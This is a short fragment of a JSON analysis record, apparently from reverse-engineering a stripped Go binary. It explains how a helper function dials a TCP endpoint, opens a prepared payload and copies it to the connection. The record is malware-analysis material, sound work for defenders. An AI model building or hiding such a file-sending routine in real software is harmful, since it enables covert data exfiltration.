    "net_Dial_name_bytes": "net.Dial\u0000",
    "decoded": "The helper saves CX/DI (payload string) at entry. It moves endpoint AX/BX into CX/DI, loads pointer to literal tcp into AX and length 3 into BX, and calls 0x97a4e0; RCX is immediately tested as the error interface. It later reloads the saved payload string and calls 0x94ac60, checks the returned error word, and passes the opened-object/result plus the connection into 0x9431a0 before deferred interface-method closes. This is the Go ABI/control-flow shape of net.Dial(\"tcp\", endpoint), opening the prepared payload, and copying it to the connection, but the sparse image lost the relevant symbol-address metadata; the retained net.Dial name string corroborates the first call family."
